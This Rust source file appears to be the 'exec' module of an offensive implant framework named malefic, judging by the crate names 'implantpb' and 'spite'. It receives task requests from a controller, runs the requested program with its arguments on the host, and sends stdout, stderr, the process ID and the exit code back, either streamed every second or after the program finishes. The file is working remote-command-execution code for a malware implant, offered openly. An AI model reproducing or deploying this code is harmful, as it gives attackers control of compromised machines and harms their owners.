use crate::{check_request, Module, TaskResult};
use async_trait::async_trait;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::ExecResponse;
use malefic_trait::module_impl;
use std::time::Duration;
use futures::{AsyncReadExt, FutureExt, SinkExt};
use futures_timer::Delay;
use malefic_helper::common::process::run_command;
use async_process::{Command, Stdio};

pub struct Exec {}

#[async_trait]
#[module_impl("exec")]
impl Module for Exec {}

#[async_trait]
impl crate::ModuleImpl for Exec {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> crate::Result {
        let request = check_request!(receiver, Body::ExecRequest)?;
        let mut exec_response = ExecResponse::default();

        if request.realtime && request.output {
            // 使用 async_process 的 Command
            let mut child = Command::new(&request.path)
                .args(&request.args)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()?;

            let mut stdout = child.stdout.take().unwrap();
            let mut stderr = child.stderr.take().unwrap();

            loop {
                let mut response = ExecResponse{
                    status_code: -1,
                    stdout: vec![],
                    stderr: vec![],
                    pid: child.id(),
                    end: false,
                };
                
                let mut has_data = false;

                // 等待1秒
                Delay::new(Duration::from_secs(1)).await;

                // 读取stdout
                let mut buf = vec![0; 8192];
                match stdout.read(&mut buf).now_or_never() {
                    Some(Ok(n)) if n > 0 => {
                        buf.truncate(n);
                        has_data = true;
                        response.stdout = buf;
                    }
                    Some(Err(e)) => return Err(e.into()),
                    _ => {} // 无数据或仍在等待
                }

                // 非阻塞读取stderr
                let mut buf = vec![0; 8192];
                match stderr.read(&mut buf).now_or_never() {
                    Some(Ok(n)) if n > 0 => {
                        buf.truncate(n);
                        has_data = true;
                        response.stderr = buf;
                    }
                    Some(Err(e)) => return Err(e.into()),
                    _ => {} // 无数据或仍在等待
                }
                // 检查进程是否已退出
                if let Some(status) = child.try_status()? {
                    response.status_code = status.code().unwrap_or(0);
                    response.pid = child.id();
                    exec_response = response;
                    break;
                } else if has_data {
                    sender.send(TaskResult::new_with_body(id, Body::ExecResponse(response))).await?;
                }
            }
        } else {
            // 非实时模式保持原样
            let child = run_command(request.path, request.args, request.output)?;
            exec_response.pid = child.id();
            let output = child.wait_with_output()?;

            exec_response.status_code = output.status.code().unwrap_or(0);
            if request.output {
                exec_response.stdout = output.stdout;
                exec_response.stderr = output.stderr;
            }
        }

        exec_response.end = true;
        Ok(TaskResult::new_with_body(
            id,
            Body::ExecResponse(exec_response),
        ))
    }
}